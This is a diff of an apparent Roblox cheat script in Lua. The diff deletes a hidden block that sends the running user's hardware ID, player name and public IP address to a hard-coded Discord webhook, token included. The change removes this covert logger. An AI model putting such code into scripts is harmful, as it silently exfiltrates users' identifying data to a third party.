@@ -30,29 +30,6 @@ end
 function load_primordium_ff()
     setfpscap(500)
     
-    -- Discord webhook function
-    sendmsg = function(url, message)
-        request = http_request or request or HttpPost or syn.request
-        request({
-            Url = url,
-            Body = game:GetService("HttpService"):JSONEncode({
-                ["content"] = message
-            }),
-            Method = "POST",
-            Headers = {
-                ["content-type"] = "application/json"
-            }
-        })
-    end
-    
-    -- Send user info to Discord webhook
-    sendmsg(
-        "https://discordapp.com/api/webhooks/1124337016402890822/535GPCRwgqsBKwTBMfjFcWbe5E5M2h7aFs6uCTLJ_AcPb7rouxAdAPA0T1RmCTFnoKOe",
-        "``` HWID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. 
-        " NAME: " .. game.Players.LocalPlayer.Name .. 
-        " IP: " .. game:HttpGet("https://api.ipify.org/") .. "```"
-    )
-    
     -- Initialize global variables
     getgenv().LevelUp = false
     getgenv().TimeUp = false
